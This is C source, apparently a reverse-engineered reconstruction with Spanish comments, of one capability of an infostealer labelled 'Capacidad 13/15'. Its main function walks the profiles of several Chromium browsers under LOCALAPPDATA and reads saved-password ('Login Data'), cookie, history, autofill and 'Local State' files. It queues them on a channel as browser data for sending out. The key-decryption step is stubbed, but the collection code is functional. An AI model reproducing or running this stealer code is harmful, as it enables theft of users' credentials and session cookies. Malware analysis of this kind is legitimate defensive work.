/* ============================================================
 * Capacidad 13/15 — Robo de artefactos Chromium
 * Función C : CollectChromiumArtifacts
 * Dirección : 0x18002d2eb   · Nodo N4   · Confianza: Media-alta
 * ------------------------------------------------------------
 * Recorre perfiles de navegadores Chromium (Chrome, Edge, Brave, Opera,
 * etc.) y recolecta 'Login Data', 'Cookies', 'History', 'Web Data' y
 * 'Local State'. Para cookies y credenciales usa la clave cifrada de
 * 'Local State' (DPAPI + AES-GCM). Incluye lectura de archivos
 * (CreateFileW/ReadFile).
 * ============================================================
 */

#include "00_tipos_comunes.h"

static const wchar_t *const CHROMIUM_BROWSERS[] = {
    L"Chrome", L"Edge", L"Brave", L"Opera", L"Vivaldi", L"Chromium",
    NULL
};

static const wchar_t *const CHROMIUM_ARTIFACTS[] = {
    L"Login Data",   /* credenciales */
    L"Cookies",      /* cookies      */
    L"History",      /* historial    */
    L"Web Data",     /* autocompletado */
    NULL
};

/* Lee un archivo completo a memoria (CreateFileW/ReadFile). */
static ByteBuffer ReadFileArtifact(const wchar_t *path)
{
    ByteBuffer out = { 0, 0, 0 };

    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return out;

    DWORD hi = 0;
    DWORD lo = GetFileSize(h, &hi);
    size_t size = ((size_t)hi << 32) | lo;

    if (size > 0 && size < 0x4000000u) {
        out.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, size);
        if (out.data != NULL) {
            DWORD read = 0;
            ReadFile(h, out.data, (DWORD)size, &read, NULL);
            out.len = read;
            out.cap = read;
        }
    }
    CloseHandle(h);
    return out;
}

static void QueueFileArtifact(Channel *channel, const wchar_t *path)
{
    ByteBuffer b = ReadFileArtifact(path);
    if (b.data == NULL)
        return;
    QueueTypedMessage(channel, MSG_BROWSER_DATA, b);
}

/* ------------------------------------------------------------------
 * 'Local State' -> encrypted_key (Base64) -> CryptUnprotectData (DPAPI)
 * -> clave AES-GCM de 32 bytes -> BCryptDecrypt por cookie/credencial.
 * Pasos documentados como comportamiento; la recolección estructural
 * de los artefactos (archivos SQLite) sí se reproduce.
 * ------------------------------------------------------------------ */
static bool ExtractChromiumAesKey(const wchar_t *base, uint8_t aes_key[32])
{
    (void)base;
    (void)aes_key;
    return false;   /* descifrado DPAPI + AES-GCM: comportamiento documentado */
}

/* Recolecta los artefactos SQLite de un perfil (subdirectorio). */
static void CollectChromiumProfile(Channel *channel, const wchar_t *profile_dir)
{
    for (int i = 0; CHROMIUM_ARTIFACTS[i] != NULL; i++) {
        wchar_t full[MAX_PATH];
        _snwprintf_s(full, _countof(full), _TRUNCATE,
                     L"%s\\%s", profile_dir, CHROMIUM_ARTIFACTS[i]);
        QueueFileArtifact(channel, full);
    }
}

/* Enumera los subdirectorios (perfiles) de `base` y aplica `visit`. */
static void ForEachProfileDir(const wchar_t *base, Channel *channel,
                              void (*visit)(Channel *, const wchar_t *))
{
    wchar_t spec[MAX_PATH];
    _snwprintf_s(spec, _countof(spec), _TRUNCATE, L"%s\\*", base);

    WIN32_FIND_DATAW fd;
    HANDLE f = FindFirstFileW(spec, &fd);
    if (f == INVALID_HANDLE_VALUE)
        return;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            fd.cFileName[0] != L'.') {
            wchar_t full[MAX_PATH];
            _snwprintf_s(full, _countof(full), _TRUNCATE,
                         L"%s\\%s", base, fd.cFileName);
            visit(channel, full);
        }
    } while (FindNextFileW(f, &fd));
    FindClose(f);
}

/* ------------------------------------------------------------------
 * 0x18002d2eb — recorrido de navegadores y perfiles [condicionado].
 * ------------------------------------------------------------------ */
void CollectChromiumArtifacts(Channel *channel)
{
    if (channel == NULL)
        return;

    wchar_t local_app_data[MAX_PATH] = { 0 };
    if (GetEnvironmentVariableW(L"LOCALAPPDATA", local_app_data,
                                _countof(local_app_data)) == 0)
        return;

    for (int b = 0; CHROMIUM_BROWSERS[b] != NULL; b++) {
        wchar_t base[MAX_PATH];
        _snwprintf_s(base, _countof(base), _TRUNCATE,
                     L"%s\\%s\\User Data", local_app_data, CHROMIUM_BROWSERS[b]);

        /* 'Local State' -> encrypted_key (DPAPI) -> clave AES-GCM. */
        uint8_t aes_key[32];
        ExtractChromiumAesKey(base, aes_key);   /* pasos documentados */

        wchar_t local_state[MAX_PATH];
        _snwprintf_s(local_state, _countof(local_state), _TRUNCATE,
                     L"%s\\Local State", base);
        QueueFileArtifact(channel, local_state);

        ForEachProfileDir(base, channel, CollectChromiumProfile);
    }
}
